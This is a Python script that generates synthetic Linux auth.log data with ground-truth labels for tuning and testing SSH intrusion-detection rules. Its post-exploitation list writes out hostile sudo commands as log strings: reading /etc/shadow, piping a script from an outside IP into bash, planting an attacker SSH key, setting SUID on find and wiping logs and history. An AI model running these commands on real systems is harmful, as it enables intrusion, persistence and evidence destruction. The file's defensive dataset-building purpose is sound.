"""Labeled auth.log simulator.

Generates realistic Linux auth.log traffic for one host with ground-truth labels:

* benign activity  – employees logging in (with typos), sudo admin work, CI deploys, cron
* benign look-alikes (labeled benign, they SHOULD be hard): a user who forgets their password,
  an admin opening a root shell, onboarding a new hire, editing crontab
* internet noise   – random IPs trying 1-3 passwords (malicious, but low value; no incident id)
* attack incidents – brute force, password spraying, brute force -> compromise -> post-exploit
  chain, low-and-slow guessing, distributed (botnet) brute force, insider privilege escalation,
  recon scanning

Output: <out>.log (raw syslog lines) and <out>.labels.jsonl, one label per line:
    {"line": 12, "malicious": true, "scenario": "password_spray", "incident": "INC-004"}

Use different seeds for a dev set (tune rules) and a test set (report results).
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path

HOST = "web01"
EMPLOYEES = {  # user -> office/VPN IP
    "alice": "10.0.1.11",
    "bob": "10.0.1.12",
    "carol": "10.0.1.13",
    "dave": "10.0.2.21",
    "erin": "10.0.2.22",
    "ops": "10.0.9.5",
}
CI_USER, CI_IP = "deploy", "10.0.5.20"
COMPROMISABLE = ["support", "test", "carol", "backup"]
SPRAY_USERS = [
    "admin", "root", "test", "user", "oracle", "postgres", "ubuntu", "guest", "ftp", "pi",
    "git", "jenkins", "hadoop", "mysql", "support", "info", "www", "dev", "nagios", "tomcat",
    "ansible", "minecraft", "steam", "backup", "server", "demo", "student", "web", "temp", "sales",
]
BENIGN_SUDO = [
    "/usr/bin/apt update", "/usr/bin/apt upgrade -y", "/bin/systemctl restart nginx",
    "/bin/systemctl status nginx", "/usr/bin/tail -n 100 /var/log/syslog",
    "/usr/bin/docker ps", "/usr/bin/docker compose up -d", "/bin/cat /etc/nginx/nginx.conf",
    "/usr/bin/journalctl -u nginx --since today", "/usr/bin/du -sh /var/www",
    "/usr/bin/certbot renew", "/bin/ls -la /root",
]
POST_EXPLOIT = [
    ("/bin/cat /etc/shadow", False),
    ("/bin/bash -c curl -s http://203.0.113.66/x.sh | bash", False),
    ("/usr/bin/wget -q http://203.0.113.66/kit -O /tmp/.k", False),
    ("/usr/sbin/useradd -m -s /bin/bash sysbackup", True),  # True -> also emits useradd lines
    ("/bin/bash -c echo ssh-rsa AAAAB3Nza...attacker >> /root/.ssh/authorized_keys", False),
    ("/bin/chmod u+s /usr/bin/find", False),
    ("/usr/bin/truncate -s 0 /var/log/wtmp", False),
    ("/bin/rm -f /root/.bash_history", False),
]


@dataclass
class Line:
    ts: datetime
    order: int
    text: str
    malicious: bool
    scenario: str
    incident: str | None


class Simulator:
    def __init__(self, seed: int, start: datetime, hours: int = 24, attacks_per_type: int = 2):
        self.rng = random.Random(seed)
        self.start = start
        self.end = start + timedelta(hours=hours)
        self.attacks_per_type = attacks_per_type
        self.lines: list[Line] = []
        self._pid = 1000
        self._uid = 1004
        self._inc = 0
        # labeling context (set by each scenario)
        self.mal = False
        self.scenario = "benign"
        self.incident: str | None = None

    # ------------------------------------------------------------------ helpers
    def ctx(self, malicious: bool, scenario: str, incident: str | None = None) -> None:
        self.mal, self.scenario, self.incident = malicious, scenario, incident

    def new_incident(self) -> str:
        self._inc += 1
        return f"INC-{self._inc:03d}"

    def pid(self) -> int:
        self._pid += self.rng.randint(1, 40)
        return self._pid

    def port(self) -> int:
        return self.rng.randint(30000, 65000)

    def rand_time(self, margin_h: float = 1.0) -> datetime:
        span = (self.end - self.start).total_seconds() - margin_h * 3600
        return self.start + timedelta(seconds=self.rng.uniform(0, max(span, 1)))

    def rand_public_ip(self) -> str:
        while True:
            a = self.rng.randint(1, 223)
            if a not in (10, 127, 172, 192):
                b, c, d = (self.rng.randint(0, 255), self.rng.randint(0, 255),
                           self.rng.randint(1, 254))
                return f"{a}.{b}.{c}.{d}"

    def emit(self, ts: datetime, proc: str, msg: str, pid: int | None = None) -> None:
        p = f"{proc}[{pid}]" if pid is not None else proc
        text = f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {HOST} {p}: {msg}"
        self.lines.append(Line(ts, len(self.lines), text, self.mal, self.scenario, self.incident))

    @staticmethod
    def s(sec: float) -> timedelta:
        return timedelta(seconds=sec)

    # ------------------------------------------------------------------ primitives
    def ssh_failures(self, ts: datetime, user: str, ip: str, n: int, valid: bool,
                     gap: tuple[float, float] = (1.0, 4.0)) -> datetime:
        """n failed password attempts over one or more connections."""
        done = 0
        while done < n:
            pid, port = self.pid(), self.port()
            per_conn = min(n - done, self.rng.randint(1, 6))
            for _ in range(per_conn):
                if valid:
                    self.emit(ts, "sshd", "pam_unix(sshd:auth): authentication failure; logname= "
                              f"uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}", pid)
                    self.emit(ts + self.s(2), "sshd",
                              f"Failed password for {user} from {ip} port {port} ssh2", pid)
                else:
                    self.emit(ts, "sshd", f"Invalid user {user} from {ip} port {port}", pid)
                    self.emit(ts, "sshd", f"input_userauth_request: invalid user {user} [preauth]",
                              pid)
                    self.emit(ts + self.s(1), "sshd",
                              "pam_unix(sshd:auth): check pass; user unknown", pid)
                    self.emit(ts + self.s(1), "sshd", "pam_unix(sshd:auth): authentication failure;"
                              f" logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}", pid)
                    self.emit(ts + self.s(3), "sshd",
                              f"Failed password for invalid user {user} from {ip} port {port} ssh2",
                              pid)
                ts += self.s(self.rng.uniform(*gap))
                done += 1
            self.emit(ts, "sshd",
                      f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]", pid)
            ts += self.s(self.rng.uniform(0.5, 2))
        return ts

    def ssh_session(self, ts: datetime, user: str, ip: str, method: str = "publickey",
                    duration_min: tuple[float, float] = (5, 90), work=None) -> datetime:
        pid, port = self.pid(), self.port()
        self.emit(ts, "sshd", f"Accepted {method} for {user} from {ip} port {port} ssh2", pid)
        self.emit(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user} by (uid=0)",
                  pid)
        end = ts + timedelta(minutes=self.rng.uniform(*duration_min))
        if work:
            work(ts + self.s(self.rng.uniform(20, 120)), end)
        self.emit(end, "sshd", f"Disconnected from user {user} {ip} port {port}", pid)
        self.emit(end, "sshd", f"pam_unix(sshd:session): session closed for user {user}", pid)
        return end

    def sudo(self, ts: datetime, user: str, cmd: str) -> None:
        self.emit(ts, "sudo", f"   {user} : TTY=pts/{self.rng.randint(0, 4)} ; PWD=/home/{user} ; "
                  f"USER=root ; COMMAND={cmd}")
        self.emit(ts, "sudo",
                  f"pam_unix(sudo:session): session opened for user root by {user}(uid=0)")
        self.emit(ts + self.s(self.rng.uniform(1, 30)), "sudo",
                  "pam_unix(sudo:session): session closed for user root")

    def sudo_fail(self, ts: datetime, user: str, n: int = 3) -> datetime:
        for _ in range(n):
            self.emit(ts, "sudo", f"pam_unix(sudo:auth): authentication failure; logname={user} "
                      f"uid=1001 euid=0 tty=/dev/pts/1 ruser={user} rhost=  user={user}")
            ts += self.s(self.rng.uniform(3, 10))
        if n >= 3:
            self.emit(ts, "sudo", f"   {user} : {n} incorrect password attempts ; TTY=pts/1 ; "
                      f"PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash")
        return ts

    def useradd(self, ts: datetime, name: str) -> None:
        self._uid += 1
        pid = self.pid()
        self.emit(ts, "useradd", f"new group: name={name}, GID={self._uid}", pid)
        self.emit(ts, "useradd", f"new user: name={name}, UID={self._uid}, GID={self._uid}, "
                  f"home=/home/{name}, shell=/bin/bash, from=/dev/pts/0", pid)

    # ------------------------------------------------------------------ benign
    def benign(self) -> None:
        self.ctx(False, "benign")
        day0 = self.start.replace(hour=0, minute=0, second=0)
        # cron every 10 minutes
        t = self.start
        while t < self.end:
            pid = self.pid()
            self.emit(t, "CRON", "pam_unix(cron:session): session opened for user root by (uid=0)",
                      pid)
            self.emit(t + self.s(1), "CRON", "pam_unix(cron:session): session closed for user root",
                      pid)
            t += timedelta(minutes=10)
        # CI deploys every 30-60 minutes
        t = self.start + timedelta(minutes=self.rng.uniform(0, 30))
        while t < self.end:
            def deploy(ts, _end):
                self.sudo(ts, CI_USER, "/usr/bin/docker compose up -d")
            self.ssh_session(t, CI_USER, CI_IP, duration_min=(1, 3), work=deploy)
            t += timedelta(minutes=self.rng.uniform(30, 60))
        # employees: 2-5 sessions per working day
        days = int((self.end - self.start).total_seconds() // 86400) + 1
        for d in range(days):
            for user, ip in EMPLOYEES.items():
                for _ in range(self.rng.randint(2, 5)):
                    t = day0 + timedelta(days=d, hours=self.rng.uniform(8, 18))
                    if not (self.start <= t < self.end - timedelta(hours=2)):
                        continue
                    method = "publickey"
                    if self.rng.random() < 0.3:  # password users, sometimes with typos
                        method = "password"
                        if self.rng.random() < 0.25:
                            t = self.ssh_failures(t, user, ip, self.rng.randint(1, 2), valid=True,
                                                  gap=(4, 12))
                    self.ssh_session(t, user, ip, method, work=self._benign_work(user))

    def _benign_work(self, user: str):
        def work(ts: datetime, end: datetime) -> None:
            admin = user in ("ops", "alice")
            for _ in range(self.rng.randint(0, 4 if admin else 1)):
                t = ts + (end - ts) * self.rng.random()
                if self.rng.random() < 0.05:
                    self.sudo_fail(t, user, n=1)  # single typo
                    t += self.s(8)
                self.sudo(t, user, self.rng.choice(BENIGN_SUDO))
        return work

    def benign_lookalikes(self) -> None:
        """Benign events that resemble attacks - the realistic source of false positives."""
        self.ctx(False, "benign_lookalike")
        # forgot password: 6 failures, then success from the office IP
        t = self.rand_time(3)
        t = self.ssh_failures(t, "dave", EMPLOYEES["dave"], 6, valid=True, gap=(5, 15))
        self.ssh_session(t + self.s(30), "dave", EMPLOYEES["dave"], "password")
        # admin opens a root shell, onboards a new hire, edits crontab
        t = self.rand_time(3)

        def admin(ts, end):
            self.sudo(ts, "ops", "/bin/bash")
            self.sudo(ts + self.s(120), "ops", "/usr/sbin/useradd -m -s /bin/bash newhire")
            self.useradd(ts + self.s(121), "newhire")
            self.sudo(ts + self.s(300), "ops", "/usr/bin/crontab -e")
        self.ssh_session(t, "ops", EMPLOYEES["ops"], duration_min=(15, 30), work=admin)

    def internet_noise(self, per_hour: float = 2.0) -> None:
        """Opportunistic internet scanning: many IPs, 1-3 attempts each. Malicious, no incident."""
        self.ctx(True, "internet_noise")
        hours = (self.end - self.start).total_seconds() / 3600
        for _ in range(int(per_hour * hours)):
            ip, t = self.rand_public_ip(), self.rand_time(0.2)
            user = self.rng.choice(SPRAY_USERS[:8])
            self.ssh_failures(t, user, ip, self.rng.randint(1, 3), valid=(user == "root"))

    # ------------------------------------------------------------------ attacks
    def attack_brute_force(self) -> None:
        self.ctx(True, "brute_force", self.new_incident())
        ip, t = self.rand_public_ip(), self.rand_time()
        self.ssh_failures(t, "root", ip, self.rng.randint(30, 150), valid=True, gap=(0.5, 2))

    def attack_password_spray(self) -> None:
        self.ctx(True, "password_spray", self.new_incident())
        ip, t = self.rand_public_ip(), self.rand_time()
        for user in self.rng.sample(SPRAY_USERS, self.rng.randint(12, 25)):
            t = self.ssh_failures(t, user, ip, 1, valid=user in ("root", "support", "backup"),
                                  gap=(10, 40))

    def attack_compromise(self) -> None:
        """Brute force -> successful login -> post-exploitation chain."""
        inc = self.new_incident()
        self.ctx(True, "brute_force_success", inc)
        ip, t = self.rand_public_ip(), self.rand_time(2)
        user = self.rng.choice(COMPROMISABLE)
        t = self.ssh_failures(t, user, ip, self.rng.randint(8, 40), valid=True, gap=(0.5, 2))
        steps = self.rng.sample(POST_EXPLOIT, self.rng.randint(3, 5))

        def post(ts, end):
            for cmd, adds_user in steps:
                self.sudo(ts, user, cmd)
                if adds_user:
                    self.useradd(ts + self.s(1), "sysbackup")
                ts += self.s(self.rng.uniform(20, 120))
        self.ssh_session(t + self.s(5), user, ip, "password", duration_min=(10, 25), work=post)

    def attack_low_and_slow(self) -> None:
        """One attempt every few minutes for hours - designed to stay under thresholds."""
        self.ctx(True, "low_and_slow", self.new_incident())
        ip, t = self.rand_public_ip(), self.rand_time(8)
        for _ in range(self.rng.randint(30, 60)):
            self.ssh_failures(t, self.rng.choice(["root", "admin"]), ip, 1, valid=True)
            t += timedelta(minutes=self.rng.uniform(4, 10))

    def attack_distributed(self) -> None:
        """Botnet: many IPs, 1-2 attempts each, same target account."""
        self.ctx(True, "distributed_brute_force", self.new_incident())
        t, user = self.rand_time(), self.rng.choice(["root", "admin"])
        for _ in range(self.rng.randint(15, 40)):
            self.ssh_failures(t, user, self.rand_public_ip(), self.rng.randint(1, 2),
                              valid=(user == "root"))
            t += self.s(self.rng.uniform(5, 30))

    def attack_insider(self) -> None:
        """Legit employee session (benign), then sudo guessing and credential access."""
        inc = self.new_incident()
        user = self.rng.choice(["bob", "erin"])
        t = self.rand_time(2)

        def bad(ts, end):
            self.ctx(True, "insider_privesc", inc)
            ts = self.sudo_fail(ts, user, n=3)
            ts += timedelta(minutes=self.rng.uniform(2, 8))
            self.sudo(ts, user, "/bin/cat /etc/shadow")
            self.sudo(ts + self.s(60), user, "/bin/bash")
            self.ctx(False, "benign")
        self.ctx(False, "benign")
        self.ssh_session(t, user, EMPLOYEES[user], duration_min=(20, 40), work=bad)

    def attack_recon(self) -> None:
        self.ctx(True, "recon_scan", self.new_incident())
        ip, t = self.rand_public_ip(), self.rand_time()
        for _ in range(self.rng.randint(4, 12)):
            pid = self.pid()
            if self.rng.random() < 0.5:
                self.emit(t, "sshd", f"Did not receive identification string from {ip}", pid)
            else:
                self.emit(t, "sshd", f"reverse mapping checking getaddrinfo for "
                          f"scan-{ip.replace('.', '-')}.example.net [{ip}] failed - "
                          "POSSIBLE BREAK-IN ATTEMPT!", pid)
            self.emit(t + self.s(1), "sshd",
                      f"Connection closed by {ip} port {self.port()} [preauth]", pid)
            t += self.s(self.rng.uniform(2, 20))

    # ------------------------------------------------------------------ run
    def run(self) -> list[Line]:
        self.benign()
        self.benign_lookalikes()
        self.internet_noise()
        for attack in (self.attack_brute_force, self.attack_password_spray, self.attack_compromise,
                       self.attack_low_and_slow, self.attack_distributed, self.attack_insider,
                       self.attack_recon):
            for _ in range(self.attacks_per_type):
                attack()
        self.lines.sort(key=lambda ln: (ln.ts, ln.order))
        return self.lines


def write_dataset(out: Path, seed: int, hours: int = 24, attacks_per_type: int = 2,
                  start: datetime | None = None) -> tuple[Path, Path]:
    start = start or datetime(2026, 11, 16, 0, 0, 0)
    lines = Simulator(seed, start, hours, attacks_per_type).run()
    out.parent.mkdir(parents=True, exist_ok=True)
    log_path, label_path = out.with_suffix(".log"), out.with_suffix(".labels.jsonl")
    with log_path.open("w") as lf, label_path.open("w") as jf:
        for i, ln in enumerate(lines):
            lf.write(ln.text + "\n")
            jf.write(json.dumps({"line": i, "malicious": ln.malicious, "scenario": ln.scenario,
                                 "incident": ln.incident}) + "\n")
    return log_path, label_path
